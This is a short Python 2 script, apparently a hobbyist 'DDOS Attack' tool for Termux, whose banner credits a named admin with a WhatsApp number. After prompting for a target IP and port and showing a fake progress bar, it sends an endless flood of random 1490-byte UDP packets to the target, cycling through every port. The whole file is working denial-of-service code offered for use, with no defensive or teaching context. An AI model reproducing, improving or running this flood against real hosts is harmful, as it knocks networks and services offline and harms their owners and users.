import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS Attack")
print
print "\033[0;97mADMIN   : \033[0;92mTAHIDUL KHAN"
print "\033[0;97mPAGE : \033[0;92mTERMUX LOVER"
print "\033[0;97mWHATS APP  : \033[0;92m+8801403380158"
print
ip = raw_input("\033[0;93m IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Raning")
print "\033[0;97m[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(4)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[0;92mSent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
